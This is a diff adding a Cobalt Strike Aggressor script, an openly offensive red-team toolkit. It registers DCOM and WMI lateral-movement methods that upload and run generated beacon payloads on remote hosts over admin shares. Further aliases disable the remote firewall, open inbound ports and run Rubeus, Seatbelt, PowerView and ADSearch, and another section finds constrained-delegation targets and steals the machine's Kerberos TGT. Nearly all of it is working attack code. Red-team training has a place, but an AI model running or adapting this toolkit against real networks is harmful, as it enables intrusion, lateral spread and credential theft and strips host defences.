@@ -1,0 +1,190 @@
+# $1 is beacon id
+# $2 target
+# $3 selected listener
+
+#GLOBAL VARIABLES
+$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
+$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
+$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
+$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
+$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
+$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
+
+#generate random printable text of length $length
+sub rand_alphanum {
+    local('$length $out $charstr $i $index');
+    $length = $1;
+    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
+    $out = '';
+    for($i = 0; $i < $length; $i++)
+    {
+        $index = rand(strlen($charstr));
+        $out = $out . substr($charstr, $index, $index + 1);
+    }
+    return $out;
+}
+
+sub invoke_dcom
+{
+    local('$handle $script $oneliner $filename $payload')
+
+    #beacon acknowledgement
+    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM")
+
+    #import the script
+    $handle = openf($INVOKE_DCOM_PATH);
+    $script = readb($handle, -1);
+    closef($handle);
+
+    #send script to beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    #generate payload (stageless)
+    $payload = artifact_payload($3, "exe", "x64");
+    $filename = rand_alphanum(4) . ".exe";
+
+    #upload payload to target
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ", $payload);
+
+    println("Invoke-DCOM Oneliner: " . $oneliner);
+    println("Filename: ". $filename);
+    #execute script from powerpick
+    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\ $+ $filename $+ ", $oneliner);
+
+    #link if p2p beacon
+    beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)
+
+sub sharpwmi
+{
+    local('$binpath $uploadpath $filename $args $payload')
+
+    #beacon acknowledgement
+    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
+    println("Running jump sharpwmi.")
+
+    #define binary path
+    $binpath = $SHARPWMI_BIN_PATH;
+
+    #generate payload (stageless)
+    $payload = artifact_payload($3, "exe", "x64");
+    $filename = rand_alphanum(4) . ".exe";
+
+    #upload payload to target
+    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ";
+    println("Uploading binary to:" . $uploadpath);
+    bupload_raw($1, $uploadpath, $payload);
+
+    #execute script from powerpick
+    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
+    println("Execution args: " . $args);
+    bexecute_assembly($1, $binpath, $args);
+
+    #link if p2p beacon
+    beacon_link($1, $2, $3);
+}
+
+beacon_remote_exploit_register("sharpwmi", "x64", "Uses SharpWMI to run remote beacon", &sharpwmi)
+
+alias import_powerview {
+    bpowershell_import($1, $POWERVIEW_PATH);
+}
+beacon_command_register(
+    "import_powerview",
+    "Imports Powerview into current beacon",
+    "Imports Powerview into current beacon");
+
+#FIREWALL ALIASES
+alias shieldsdown {
+    #This function creates a service on the remote host, starts it, and cleans it up.
+    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
+}
+beacon_command_register(
+    "shieldsdown",
+    "Disables host firewall",
+    "Disables host firewall");
+
+alias openport {
+    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
+    bpowerpick($1, "powerpick new-netfirewallrule -displayname \" $+ $2 $- -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
+}
+beacon_command_register(
+    "openport",
+    "Opens the port specified",
+    "Opens the port specified");
+
+#EXECUTE ASSEMBLY ALIASE
+alias rubeus {
+    bexecute_assembly($1, $RUBEUS_PATH, $2)
+}
+beacon_command_register(
+    "rubeus",
+    "Execute Assmembly of Rubeus",
+    "Execute Assmembly of Rubeus\n\nArgs must be wrapped in double quotes");
+
+alias seatbelt {
+    bexecute_assembly($1, $SEATBELT_PATH, $2)
+}
+beacon_command_register(
+    "seatbelt",
+    "Execute Assmembly of Seatbelt",
+    "Execute Assmembly of Seatbelt\n\nArgs must be wrapped in double quotes");
+
+alias adsearch {
+    bexecute_assembly($1, $ADSEARCH_PATH, $2)
+}
+beacon_command_register(
+    "adsearch",
+    "Execute Assmembly of ADSearch",
+    "Execute Assmembly of ADSearch\n\nArgs must be wrapped in double quotes");
+
+#CONSTRAINED DELEGATION
+#FINDING TARGETS
+alias constdel01_findtargets {
+#execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
+}
+beacon_command_register(
+    "constdel01_findtargets",
+    "Find Constrained Delegation Targets");
+
+#TRIAGE THEN DUMP TGT
+#regex: /^ \| (0[xX][0-9a-fA-F]+) {1,10}\| .*HOST_NAME\$.*krbtgt/gm
+sub constdel02_stealtgt_cb {
+    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
+    local('$hostname $regx $luid');
+
+    println($2);
+    $hostname = lc(binfo($1, "computer"));
+    println("hostname: " . $hostname);
+
+    #$regx = '(0x\w+)'; #returns all luids
+    #$regx = '(0x\w+).*' . $hostname . ''; #THIS SHIT WORKS!
+    $regx = '(0x\w+).*' . $hostname;
+    
+    println("regx: " . $regx);
+    $luid = matches($2, $regx)[0];
+    println("luid: " . $luid);
+}
+
+alias constdel02_stealtgt {
+    #execute assembly and pass results to helper sub, run LUID
+    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel02_stealtgt_cb)
+}
+beacon_command_register(
+    "constdel02_stealtgt",
+    "Steal the local machine TGT");
+
+#TEST FUNCTION
+command beacons {
+   local('$entry $key $value');
+   foreach $entry (beacons()) {
+      println("== " . $entry['id'] . " ==");
+      foreach $key => $value ($entry) {
+         println("$[20]key : $value");
+      }
+      println();
+   }
+}
